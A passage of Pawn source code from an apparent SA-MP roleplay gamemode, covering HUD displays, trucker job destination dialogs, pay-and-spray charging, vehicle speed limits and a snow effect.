			PlayerTextDrawSetString(playerid, KenoTD[105], MGLOBAL);
			GivePlayerCash(playerid, sumabani);
		}	
		if(acastigat == 0) 
		{
			PlayerTextDrawSetString(playerid, KenoTD[98], "Ai_pierdut");
			format(MGLOBAL, sizeof(MGLOBAL), "$%s",FormatNumber(MizaKeno[playerid]));
			PlayerTextDrawSetString(playerid, KenoTD[105], MGLOBAL);
			PlayerTextDrawSetString(playerid, KenoTD[106], "PIERDUT");
			GivePlayerCash(playerid, -MizaKeno[playerid]);
		}	
		format(MGLOBAL, sizeof(MGLOBAL), "$%s",FormatNumber(GetPlayerCash(playerid)));
		PlayerTextDrawSetString(playerid, KenoTD[102], MGLOBAL);
		PlayerTextDrawShow(playerid, KenoTD[98]);
		PlayerTextDrawShow(playerid, KenoTD[102]);
		PlayerTextDrawShow(playerid, KenoTD[106]);
		PlayerTextDrawShow(playerid, KenoTD[105]);
	}*/	
	if(RobTime[playerid] > 0)
	{
		RobTime[playerid]--;
		if(BusinessRob[playerid] == 3) ApplyAnimation(playerid, "ROB_BANK", "CAT_Safe_Rob", 4.0, 1, 0, 0, 0, 0);
		if(BusinessRob[playerid] == 2) ClearAnimations(playerid);
	}
	if(RobTime[playerid] == 0)
	{
		RobTime[playerid] = -1;
		if(BusinessRob[playerid] == 3) ApplyAnimation(playerid, "ROB_BANK", "CAT_Safe_Rob", 4.0, 1, 0, 0, 0, 0);
		if(BusinessRob[playerid] == 2) ClearAnimations(playerid);
	}
	if(InTunning[playerid] == 3)
	{
		InTunning[playerid] = 0;
		for( new i = 0; i < 15; i ++) 
		{
			PlayerTextDrawHide( playerid, TuningBuy[playerid][i]);
		}
		for(new i = 0; i < sizeof(TuneTD); i++) PlayerTextDrawHide(playerid, TuneTD[i]);
		TogglePlayerControllable(playerid, 1);
		SetVehiclePos(GetPlayerVehicleID(playerid),  1040.8484,-1029.3612,32.1016);
		SetCameraBehindPlayer(playerid);
		SetPlayerVirtualWorld(playerid, 0);
		SetVehicleVirtualWorld(GetPlayerVehicleID(playerid), 0);
	}
	if(IsPlayerInAnyVehicle(playerid))
	{
		if(IsAnOwnableCar(GetPlayerVehicleID(playerid)))
		{
			if(CarInfo[OwnedVeh(GetPlayerVehicleID(playerid))][cOwned] == 1 && CarInfo[OwnedVeh(GetPlayerVehicleID(playerid))][cNewEngine] == 0)
			{
				new maxspeed;
				for(new i = 0; i < stockss; i++) if(CarInfo[OwnedVeh(GetPlayerVehicleID(playerid))][cModel] == Stock[i][vModel]) maxspeed = Stock[i][vSpeed];  
				if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
				{
					new a, b, c;
					GetPlayerKeys(playerid, a, b ,c);
					if(a == 8 && GetVehicleSpeed(GetPlayerVehicleID(playerid), 0) > maxspeed)
					{
						new newspeed = GetVehicleSpeed(GetPlayerVehicleID(playerid), 0) - maxspeed;
						ModifyVehicleSpeed(GetPlayerVehicleID(playerid), -newspeed);
					}
				}
			}
		}
	}	
	new string[128],drunknew = GetPlayerDrunkLevel(playerid);
	if (drunknew < 100) 
	{
		SetPlayerDrunkLevel(playerid, 2000);
	} 
	else 
	{

		if(PlayerInfo[playerid][pDrunkLevelLast] != drunknew) 
		{
			new wfps = PlayerInfo[playerid][pDrunkLevelLast] - drunknew;

			if ((wfps > 0) && (wfps < 200))
				PlayerInfo[playerid][pFPS] = wfps;

			PlayerInfo[playerid][pDrunkLevelLast] = drunknew;
		}

	}
	if(GetPlayerSurfingVehicleID(playerid) != INVALID_VEHICLE_ID && GetPlayerWeapon(playerid) != 0)
	{
	    new Float: slx, Float: sly, Float:slz;
	    GetPlayerPos(playerid, slx, sly, slz);
		SetPlayerPosEx(playerid, slx, sly, slz+5);
	    SetPlayerArmedWeapon(playerid,0);
		SendClientMessage(playerid, COLOR_RED, "You can not use weapons in a car!");
	}
	if(GetPlayerState(playerid) == 2)
	{
		for(new v; v < MAX_SPIKES; v++)
		{
			if(SpikeInfo[v][sPos][0] != 0 && SpikeInfo[v][sPos][1] != 0 && SpikeInfo[v][sPos][2] != 0)
			{
				if(IsVehicleInRangeOfPoint(GetPlayerVehicleID(playerid), 2.0, SpikeInfo[v][sPos][0], SpikeInfo[v][sPos][1], SpikeInfo[v][sPos][2]))
				{
					new Damage[4];
					GetVehicleDamageStatus(GetPlayerVehicleID(playerid), Damage[0], Damage[1], Damage[2], Damage[3]); // Set tires to 15 and watch 'em pop.
					UpdateVehicleDamageStatus(GetPlayerVehicleID(playerid), Damage[0], Damage[1], Damage[2], 15);
				}
			}
		}
	}
	if(PlayerInfo[playerid][pHUD1] != 0)
	{
	    new Float:health;
	    GetPlayerHealth(playerid,health);
	    PlayerTextDrawShow(playerid, HUD[1][playerid]);
	    format(string,sizeof(string),"%.0f",health);
	    if(PlayerInfo[playerid][pHUD1] == 1)
	    {
			PlayerTextDrawColor(playerid, HUD[1][playerid], 0xC0C0C0FF);
		}
		else if(PlayerInfo[playerid][pHUD1] == 2)
	    {
			PlayerTextDrawColor(playerid, HUD[1][playerid], 0xFF0000FF);
		}
		else if(PlayerInfo[playerid][pHUD1] == 3)
	    {
			PlayerTextDrawColor(playerid, HUD[1][playerid], 0x00FF00FF);
		}
		else if(PlayerInfo[playerid][pHUD1] == 4)
	    {
			PlayerTextDrawColor(playerid, HUD[1][playerid], 0x0000FFFF);
		}
		else if(PlayerInfo[playerid][pHUD1] == 5)
	    {
	        PlayerTextDrawColor(playerid, HUD[1][playerid], 0xFFFF00FF);
		}
		PlayerTextDrawSetString(playerid, HUD[1][playerid], string);
		PlayerTextDrawShow(playerid, HUD[1][playerid]);
	}
	if(PlayerInfo[playerid][pHUD2] != 0)
	{
	    new Float:armour;
	    GetPlayerArmour(playerid,armour);
	    PlayerTextDrawShow(playerid, HUD[2][playerid]);
	    format(string,sizeof(string),"%.0f",armour);
	    if(PlayerInfo[playerid][pHUD2] == 1)
	    {
			PlayerTextDrawColor(playerid, HUD[2][playerid], 0xC0C0C0FF);
		}
		else if(PlayerInfo[playerid][pHUD2] == 2)
	    {
			PlayerTextDrawColor(playerid, HUD[2][playerid], 0xFF0000FF);
		}
		else if(PlayerInfo[playerid][pHUD2] == 3)
	    {
			PlayerTextDrawColor(playerid, HUD[2][playerid], 0x00FF00FF);
		}
		else if(PlayerInfo[playerid][pHUD2] == 4)
	    {
			PlayerTextDrawColor(playerid, HUD[2][playerid], 0x0000FFFF);
		}
		else if(PlayerInfo[playerid][pHUD2] == 5)
	    {
	        PlayerTextDrawColor(playerid, HUD[2][playerid], 0xFFFF00FF);
		}
		PlayerTextDrawSetString(playerid, HUD[2][playerid], string);
		PlayerTextDrawShow(playerid, HUD[2][playerid]);
		if(armour < 1)
	    {
	        PlayerTextDrawHide(playerid, HUD[2][playerid]);
		}
	}
	if(PlayerInfo[playerid][pHUD3] != 0)
	{
	    PlayerTextDrawShow(playerid, HUD[3][playerid]);
		format(string,sizeof(string),"%d",PlayerInfo[playerid][pFPS]);
		PlayerTextDrawSetString(playerid, HUD[3][playerid], string);
		PlayerTextDrawShow(playerid, HUD[3][playerid]);
	}
	return 1;
}

public Truckerr1(playerid)
{
	if(!IsATruck(GetPlayerVehicleID(playerid))) return SendClientMessage(playerid, COLOR_SERVER, "Error! You are not the driver!");
    new string1[MAX_STRING],string2[MAX_STRING],string3[MAX_STRING],string4[MAX_STRING],string5[MAX_STRING],string6[MAX_STRING],allstrings[MAX_STRING];
    new Float: Position[3],
    	Float: Distance[19];
	GetPlayerPos(playerid, Position[0], Position[1], Position[2]);
	Distance[1] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], CHKTruck[2][0], CHKTruck[2][1], CHKTruck[2][2]);
	Distance[2] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], CHKTruck[4][0], CHKTruck[4][1], CHKTruck[4][2]);
	Distance[3] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], CHKTruck[11][0], CHKTruck[11][1], CHKTruck[11][2]);
	Distance[4] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], CHKTruck[10][0], CHKTruck[10][1], CHKTruck[10][2]);
	Distance[5] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], CHKTruck[7][0], CHKTruck[7][1], CHKTruck[7][2]);
	Distance[6] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], CHKTruck[6][0], CHKTruck[6][1], CHKTruck[6][2]);
	Distance[7] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], CHKTruck[8][0], CHKTruck[8][1], CHKTruck[8][2]);
	Distance[8] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], CHKTruck[9][0], CHKTruck[9][1], CHKTruck[9][2]);
	Distance[9] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], CHKTruck[3][0], CHKTruck[3][1], CHKTruck[3][2]);
	Distance[10] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], CHKTruck[5][0], CHKTruck[5][1], CHKTruck[5][2]);
	Distance[11] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], CHKTruck[12][0], CHKTruck[12][1], CHKTruck[12][2]);
	Distance[12] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], CHKTruck[13][0], CHKTruck[13][1], CHKTruck[13][2]);
	Distance[13] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], CHKTruck[17][0], CHKTruck[17][1], CHKTruck[17][2]);
	Distance[14] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], CHKTruck[15][0], CHKTruck[15][1], CHKTruck[15][2]);
	Distance[15] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], CHKTruck[16][0], CHKTruck[16][1], CHKTruck[16][2]);
	Distance[16] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], CHKTruck[14][0], CHKTruck[14][1], CHKTruck[14][2]);
 	format(string1,sizeof(string1),"{FFFFFF}LS Pizza Delivery (%.0fm) - {568203}legal\n{FFFFFF}LS Chop Shop (%.0fm) - {FF0000}illegal\n{FFFFFF}LV Chuckup (%.0fm) - {FF0000}illegal",Distance[1],Distance[2],Distance[3]);
 	format(string2,sizeof(string2),"{FFFFFF}LV Pirate Ship (%.0fm) - {FF0000}illegal\n{FFFFFF}LV Clothing Store (%.0fm) - {568203}legal\n{FFFFFF}LV Gas Station (%.0fm) - {FF0000}explosive",Distance[4],Distance[5],Distance[6]);
  	format(string3,sizeof(string3),"{FFFFFF}LV Burger Shot (%.0fm) - {568203}legal\n{FFFFFF}LV Pool (%.0fm) - {568203}legal\n{FFFFFF}LS 8 Track (%.0fm) - {568203}legal",Distance[7],Distance[8],Distance[9]);
  	format(string4,sizeof(string4),"{FFFFFF}LS Crack House (%.0fm) - {FF0000}illegal\n{FFFFFF}SF Ship (%.0fm) - {568203}legal\n{FFFFFF}SF Gas Station (%.0fm) - {FF0000}explosive",Distance[10],Distance[11],Distance[12]);
   	format(string5,sizeof(string5),"{FFFFFF}SF Homies Sharp (%.0fm) - {568203}legal\n{FFFFFF}SF Supa Save! (%.0fm) - {FF0000}illegal\n{FFFFFF}SF Restaurant (%.0fm) - {FF0000}illegal",Distance[13],Distance[14],Distance[15]);
    format(string6,sizeof(string6),"{FFFFFF}SF Pier 69 Pizza Place (%.0fm) - {568203}legal",Distance[16]);
    format(allstrings,sizeof(allstrings), "%s\n%s\n%s\n%s\n%s\n%s", string1, string2, string3, string4, string5, string6);
    ShowPlayerDialog(playerid, DIALOG_TRUCKER1, DIALOG_STYLE_LIST, "Choose destination", allstrings, "Ok", "Cancel");
    return 1;
}

public Truckerr2(playerid)
{
    if(!IsATruck(GetPlayerVehicleID(playerid))) return SendClientMessage(playerid, COLOR_SERVER, "Error! You are not the driver!");
	new string1[MAX_STRING],string2[MAX_STRING],string3[MAX_STRING],string4[MAX_STRING],allstrings[MAX_STRING];
 	new Float: Position[3],
  		Float: Distance[19];
	GetPlayerPos(playerid, Position[0], Position[1], Position[2]);
	Distance[1] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], CHKTruck[11][0], CHKTruck[11][1], CHKTruck[11][2]);
	Distance[2] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], CHKTruck[10][0], CHKTruck[10][1], CHKTruck[10][2]);
	Distance[3] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], CHKTruck[7][0], CHKTruck[7][1], CHKTruck[7][2]);
	Distance[4] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], CHKTruck[6][0], CHKTruck[6][1], CHKTruck[6][2]);
	Distance[5] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], CHKTruck[8][0], CHKTruck[8][1], CHKTruck[8][2]);
	Distance[6] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], CHKTruck[9][0], CHKTruck[9][1], CHKTruck[9][2]);
	Distance[7] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], CHKTruck[0][0], CHKTruck[0][1], CHKTruck[0][2]);
	Distance[8] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], CHKTruck[12][0], CHKTruck[12][1], CHKTruck[12][2]);
	Distance[9] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], CHKTruck[13][0], CHKTruck[13][1], CHKTruck[13][2]);
	Distance[10] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], CHKTruck[17][0], CHKTruck[17][1], CHKTruck[17][2]);
	Distance[11] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], CHKTruck[15][0], CHKTruck[15][1], CHKTruck[15][2]);
	Distance[12] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], CHKTruck[16][0], CHKTruck[16][1], CHKTruck[16][2]);
 	format(string1,sizeof(string1),"{FFFFFF}LV Chuckup (%.0fm) - {FF0000}illegal\n{FFFFFF}LV Pirate Ship (%.0fm) - {FF0000}illegal\n{FFFFFF}LV Clothing Store (%.0fm) - {568203}legal",Distance[1],Distance[2],Distance[3]);
 	format(string2,sizeof(string2),"{FFFFFF}LV Gas Station (%.0fm) - {FF0000}explosive\n{FFFFFF}LV Burger Shot (%.0fm) - {568203}legal\n{FFFFFF}LV Pool (%.0fm) - {568203}legal",Distance[4],Distance[5],Distance[6]);
 	format(string3,sizeof(string3),"{FFFFFF}LS Gas Station (%.0fm) - {FF0000}explosive\n{FFFFFF}SF Ship (%.0fm) - {568203}legal\n{FFFFFF}SF Gas Station (%.0fm) - {FF0000}explosive",Distance[7],Distance[8],Distance[9]);
 	format(string4,sizeof(string4),"{FFFFFF}SF Homies Sharp (%.0fm) - {568203}legal\n{FFFFFF}SF Supa Save! (%.0fm) - {FF0000}illegal\n{FFFFFF}SF Restaurant (%.0fm) - {FF0000}illegal",Distance[10],Distance[11],Distance[12]);
 	format(allstrings,sizeof(allstrings), "%s\n%s\n%s\n%s", string1, string2, string3, string4);
 	ShowPlayerDialog(playerid, DIALOG_TRUCKER2, DIALOG_STYLE_LIST, "Choose destination", allstrings, "Ok", "Cancel");
 	return 1;
}

public Truckerr3(playerid)
{
    if(!IsATruck(GetPlayerVehicleID(playerid))) return SendClientMessage(playerid, COLOR_SERVER, "Error! You are not the driver!");
    new string1[MAX_STRING],string2[MAX_STRING],string3[MAX_STRING],string4[MAX_STRING],allstrings[MAX_STRING];
    new Float: Position[3],
		Float: Distance[19];
	GetPlayerPos(playerid, Position[0], Position[1], Position[2]);
	Distance[1] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], CHKTruck[2][0], CHKTruck[2][1], CHKTruck[2][2]);
	Distance[2] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], CHKTruck[4][0], CHKTruck[4][1], CHKTruck[4][2]);
	Distance[3] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], CHKTruck[3][0], CHKTruck[3][1], CHKTruck[3][2]);
	Distance[4] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], CHKTruck[5][0], CHKTruck[5][1], CHKTruck[5][2]);
	Distance[5] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], CHKTruck[1][0], CHKTruck[1][1], CHKTruck[1][2]);
	Distance[6] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], CHKTruck[0][0], CHKTruck[0][1], CHKTruck[0][2]);
	Distance[7] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], CHKTruck[12][0], CHKTruck[12][1], CHKTruck[12][2]);
	Distance[8] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], CHKTruck[13][0], CHKTruck[13][1], CHKTruck[13][2]);
	Distance[9] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], CHKTruck[17][0], CHKTruck[17][1], CHKTruck[17][2]);
	Distance[10] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], CHKTruck[15][0], CHKTruck[15][1], CHKTruck[15][2]);
	Distance[11] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], CHKTruck[16][0], CHKTruck[16][1], CHKTruck[16][2]);
	Distance[12] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], CHKTruck[14][0], CHKTruck[14][1], CHKTruck[14][2]);
 	format(string1,sizeof(string1),"{FFFFFF}LS Pizza Delivery (%.0fm) - {568203}legal\n{FFFFFF}LS Chop Shop (%.0fm) - {FF0000}illegal\n{FFFFFF}LS 8 Track (%.0fm) - {568203}legal",Distance[1],Distance[2],Distance[3]);
 	format(string2,sizeof(string2),"{FFFFFF}LS Crack House (%.0fm) - {FF0000}illegal\n{FFFFFF}LS 24/7 Store (%.0fm) - {568203}legal\n{FFFFFF}LS Gas Station (%.0fm) - {FF0000}explosive",Distance[4],Distance[5],Distance[6]);
 	format(string3,sizeof(string3),"{FFFFFF}SF Ship (%.0fm) - {568203}legal\n{FFFFFF}SF Gas Station (%.0fm) - {FF0000}explosive\n{FFFFFF}SF Homies Sharp (%.0fm) - {568203}legal",Distance[7],Distance[8],Distance[9]);
 	format(string4,sizeof(string4),"{FFFFFF}SF Supa Save! (%.0fm) - {FF0000}illegal\n{FFFFFF}SF Restaurant (%.0fm) - {FF0000}illegal\n{FFFFFF}SF Pier 69 Pizza Place (%.0fm) - {568203}legal",Distance[10],Distance[11],Distance[12]);
    format(allstrings,sizeof(allstrings), "%s\n%s\n%s\n%s", string1, string2, string3, string4);
    ShowPlayerDialog(playerid, DIALOG_TRUCKER3, DIALOG_STYLE_LIST, "Choose destination", allstrings, "Ok", "Cancel");
	return 1;
}

public Truckerr4(playerid)
{
    if(!IsATruck(GetPlayerVehicleID(playerid))) return SendClientMessage(playerid, COLOR_SERVER, "Error! You are not the driver!");
    new string1[MAX_STRING],string2[MAX_STRING],string3[MAX_STRING],string4[MAX_STRING],allstrings[MAX_STRING];
    new Float: Position[3],
    	Float: Distance[19];
	GetPlayerPos(playerid, Position[0], Position[1], Position[2]);
	Distance[1] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], CHKTruck[2][0], CHKTruck[2][1], CHKTruck[2][2]);
	Distance[2] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], CHKTruck[4][0], CHKTruck[4][1], CHKTruck[4][2]);
	Distance[3] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], CHKTruck[11][0], CHKTruck[11][1], CHKTruck[11][2]);
	Distance[4] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], CHKTruck[10][0], CHKTruck[10][1], CHKTruck[10][2]);
	Distance[5] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], CHKTruck[7][0], CHKTruck[7][1], CHKTruck[7][2]);
	Distance[6] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], CHKTruck[6][0], CHKTruck[6][1], CHKTruck[6][2]);
	Distance[7] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], CHKTruck[8][0], CHKTruck[8][1], CHKTruck[8][2]);
	Distance[8] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], CHKTruck[9][0], CHKTruck[9][1], CHKTruck[9][2]);
	Distance[9] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], CHKTruck[3][0], CHKTruck[3][1], CHKTruck[3][2]);
	Distance[10] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], CHKTruck[5][0], CHKTruck[5][1], CHKTruck[5][2]);
	Distance[11] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], CHKTruck[1][0], CHKTruck[1][1], CHKTruck[1][2]);
	Distance[12] = GetDistanceBetweenPoints(Position[0],Position[1], Position[2], CHKTruck[0][0], CHKTruck[0][1], CHKTruck[0][2]);
	format(string1,sizeof(string1),"{FFFFFF}LS Pizza Delivery (%.0fm) - {568203}legal\n{FFFFFF}LS Chop Shop (%.0fm) - {FF0000}illegal\n{FFFFFF}LV Chuckup (%.0fm) - {FF0000}illegal",Distance[1],Distance[2],Distance[3]);
	format(string2,sizeof(string2),"{FFFFFF}LV Pirate Ship (%.0fm) - {FF0000}illegal\n{FFFFFF}LV Clothing Store (%.0fm) - {568203}legal\n{FFFFFF}LV Gas Station (%.0fm) - {FF0000}explosive",Distance[4],Distance[5],Distance[6]);
	format(string3,sizeof(string3),"{FFFFFF}LV Burger Shot (%.0fm) - {568203}legal\n{FFFFFF}LV Pool (%.0fm) - {568203}legal\n{FFFFFF}LS 8 Track (%.0fm) - {568203}legal",Distance[7],Distance[8],Distance[9]);
	format(string4,sizeof(string4),"{FFFFFF}LS Crack House (%.0fm) - {FF0000}illegal\n{FFFFFF}LS 24/7 Store (%.0fm) - {568203}legal\n{FFFFFF}LS Gas Station (%.0fm) - {FF0000}explosive",Distance[10],Distance[11],Distance[12]);
	format(allstrings,sizeof(allstrings), "%s\n%s\n%s\n%s", string1, string2, string3, string4);
	ShowPlayerDialog(playerid, DIALOG_TRUCKER4, DIALOG_STYLE_LIST, "Choose destination", allstrings, "Ok", "Cancel");
	return 1;
}

public AfterSpray(playerid)
{
	new carid = GetPlayerVehicleID(playerid),
		Float:health,
		string[MAX_STRING];
    if(IsPlayerInRangeOfPoint(playerid,50.0,1025.0671,-1023.7895,32.1016))
	{
	    GetVehicleHealth(carid, health);
	    if(health == 1000.0)
	    {
			Cash[playerid] -= BizzInfo[36][bEntranceCost];
			Update(playerid, pCashx);
			BizzInfo[36][bTill] += BizzInfo[36][bEntranceCost];
			new str[128];
			mysql_format(SQL,str,sizeof(str),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='36'",BizzInfo[36][bTill]);
			mysql_tquery(SQL,str,"","");
			format(string,sizeof(string),"~r~-%d$", BizzInfo[36][bEntranceCost]);
   			GameTextForPlayer(playerid, string, 5000, 1);
			return 1;
		}
	}
	if(IsPlayerInRangeOfPoint(playerid,50.0,719.9537,-457.2771,16.3359))
	{
	    GetVehicleHealth(carid, health);
	    if(health == 1000.0)
	    {
			new str[128];
			Cash[playerid] -= BizzInfo[34][bEntranceCost];
			Update(playerid, pCashx);
			BizzInfo[34][bTill] += BizzInfo[34][bEntranceCost];
			mysql_format(SQL,str,sizeof(str),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='34'",BizzInfo[34][bTill]);
			mysql_tquery(SQL,str,"","");
			format(string,sizeof(string),"~r~-%d$", BizzInfo[34][bEntranceCost]);
   			GameTextForPlayer(playerid, string, 5000, 1);
			return 1;
		}
	}
	if(IsPlayerInRangeOfPoint(playerid,50.0,487.4134,-1740.1738,11.1370))
	{
	    GetVehicleHealth(carid, health);
	    if(health == 1000.0)
	    {
			Cash[playerid] -= BizzInfo[37][bEntranceCost];
			Update(playerid, pCashx);
			BizzInfo[37][bTill] += BizzInfo[37][bEntranceCost];
			new str[128];
			mysql_format(SQL,str,sizeof(str),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='37'",BizzInfo[37][bTill]);
			mysql_tquery(SQL,str,"","");
			format(string,sizeof(string),"~r~-%d$", BizzInfo[37][bEntranceCost]);
   			GameTextForPlayer(playerid, string, 5000, 1);
			return 1;
		}
	}
	if(IsPlayerInRangeOfPoint(playerid,50.0,2065.5911,-1831.4495,13.5469))
	{
	    GetVehicleHealth(carid, health);
	    if(health == 1000.0)
	    {
			new str[128];
			Cash[playerid] -= BizzInfo[35][bEntranceCost];
			Update(playerid, pCashx);
			BizzInfo[35][bTill] += BizzInfo[35][bEntranceCost];
			mysql_format(SQL,str,sizeof(str),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='35'",BizzInfo[35][bTill]);
			mysql_tquery(SQL,str,"","");
			format(string,sizeof(string),"~r~-%d$", BizzInfo[35][bEntranceCost]);
   			GameTextForPlayer(playerid, string, 5000, 1);
			return 1;
		}
	}
	if(IsPlayerInRangeOfPoint(playerid,50.0,1974.3198,2162.7249,11.0703))
	{
	    GetVehicleHealth(carid, health);
	    if(health == 1000.0)
	    {
   			Cash[playerid] -= BizzInfo[40][bEntranceCost];
			Update(playerid, pCashx);
			BizzInfo[40][bTill] += BizzInfo[40][bEntranceCost];
			new str[128];
			mysql_format(SQL,str,sizeof(str),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='40'",BizzInfo[40][bTill]);
			mysql_tquery(SQL,str,"","");
			format(string,sizeof(string),"~r~-%d$", BizzInfo[40][bEntranceCost]);
   			GameTextForPlayer(playerid, string, 5000, 1);
			return 1;
		}
	}
	if(IsPlayerInRangeOfPoint(playerid,50.0,-100.1086,1117.3312,19.7417))
	{
	    GetVehicleHealth(carid, health);
	    if(health == 1000.0)
	    {
			Cash[playerid] -= BizzInfo[41][bEntranceCost];
			Update(playerid, pCashx);
			BizzInfo[41][bTill] += BizzInfo[41][bEntranceCost];
			new str[128];
			mysql_format(SQL,str,sizeof(str),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='41'",BizzInfo[41][bTill]);
			mysql_tquery(SQL,str,"","");
			format(string,sizeof(string),"~r~-%d$", BizzInfo[41][bEntranceCost]);
   			GameTextForPlayer(playerid, string, 5000, 1);
			return 1;
		}
	}
	return 1;
}
stock CreateSnow(playerid)
{	
	if(IsPlayerInArea(playerid, 44.60, -2892.90, 2997.00, -768.00))
	{
		if(GetPlayerVirtualWorld(playerid) == 0 && GetPlayerInterior(playerid) == 0 && zapada == 1)
		{	
			DestroySnow(playerid);
			snowActive[playerid] = 1;
			
			new
				Float:x,
				Float:y,
				Float:z;

			GetPlayerPos(playerid, x, y, z);
			for(new i = 0; i < MAX_SNOW; i++)
			{
				snowObject[playerid][i] = CreatePlayerObject(playerid, SNOW_OBJECT, x, y , z , 0, 0, 0);
				RecreateSnow(playerid, snowObject[playerid][i]);
			}
		}
	}	
	return 1;
}
stock DestroySnow(playerid)
{
	snowActive[playerid] = 0;

	for(new i = 0; i < MAX_SNOW; i++)
	{
	    DestroyPlayerObject(playerid, snowObject[playerid][i]);
	}
}

stock RecreateSnow(playerid, objectid)
{
	if(IsPlayerInArea(playerid, 44.60, -2892.90, 2997.00, -768.00))
	{
		if(GetPlayerVirtualWorld(playerid) == 0 && GetPlayerInterior(playerid) == 0 && zapada == 1)
		{
			if(snowActive[playerid] == 0)
			{
				return 1;
			}
			new
				Float:x,
				Float:y,
				Float:z,
				Float:objX,
				Float:objY,
				Float:objZ;
				
			GetPlayerPos(playerid, x, y, z);

			new i = random(random(100));

			if(i < 20)
			{
				SetPlayerObjectPos(playerid, objectid, x - random(random(100)), y + random (random(70)), z + random(20)+20);
			}
			else if(i >= 21 && i <= 30)
			{
				SetPlayerObjectPos(playerid, objectid, x + random(random(100)), y + random (random(70)), z + random(20)+20);
			}
			else if (i >= 31 && i < 40)
			{
				SetPlayerObjectPos(playerid, objectid, x + random(random(70)), y - random (random(100)), z + random(20)+20);
			}
			else
			{
				SetPlayerObjectPos(playerid, objectid, x + random(random(120)), y + random (random(30)), z + random(20)+20);
			}

			GetPlayerObjectPos(playerid, objectid, objX, objY, objZ);

			MovePlayerObject(playerid, objectid, objX, objY, z-10, random(70)+5);
		}
	}	
	return 1;
}
public OnPlayerObjectMoved(playerid, objectid)
{
	if(zapada == 1)
	{
		if(snowActive[playerid] == 0)
		{
			return 1;
		}
		for(new i = 0; i < MAX_SNOW; i++)
		{
			if(objectid == snowObject[playerid][i])
			{
				RecreateSnow(playerid, objectid);
				return 1;
			}
		}
	}	
	return 1;
}
public OnPlayerSpawn(playerid)
{
	ucideri_detectare_aimbot[playerid] = 0;
	/*QuestTimer[playerid] = -1;
	new remain = ultimulomdezapada;
	for(new qs=0; qs<=50; qs++)
	{
		if(QEvent[playerid][qs] == 1)
		{
			remain--;
		}
	}
	if(remain > 0)
	{
		for(new id = 0; id < sizeof(OMZapada); id++)
		{
			for(new id2 = 0; id2 < 9; id2++)
			{
				if(IsValidDynamicObject(Omdezapada[playerid][id][id2]))
				{
					DestroyDynamicObject(Omdezapada[playerid][id][id2]);
					Omdezapada[playerid][id][id2] = -1;
				}
			}
			if(QEvent[playerid][id] == 0)
			{	
				Omdezapada[playerid][id][0] = CreateDynamicObject(1305, OMZapada[id][PozitieOMZapada][0], OMZapada[id][PozitieOMZapada][1], OMZapada[id][PozitieOMZapada][2]-0.6,  0.00000, 0.00000, 0.00000,-1, -1, playerid, 200.0);
				Omdezapada[playerid][id][1] = CreateDynamicObject(1305, OMZapada[id][PozitieOMZapada][0], OMZapada[id][PozitieOMZapada][1], OMZapada[id][PozitieOMZapada][2]+1.3,   0.00000, 0.00000, 0.00000,-1, -1, playerid, 200.0);
				Omdezapada[playerid][id][2] = CreateDynamicObject(1304, OMZapada[id][PozitieOMZapada][0], OMZapada[id][PozitieOMZapada][1], OMZapada[id][PozitieOMZapada][2]+3.5,   0.00000, 0.00000, 0.00000,-1, -1, playerid, 200.0);
				SetDynamicObjectMaterial(Omdezapada[playerid][id][0], 0, 3914, "snow", "mp_snow", 0xFFFFFFFF);
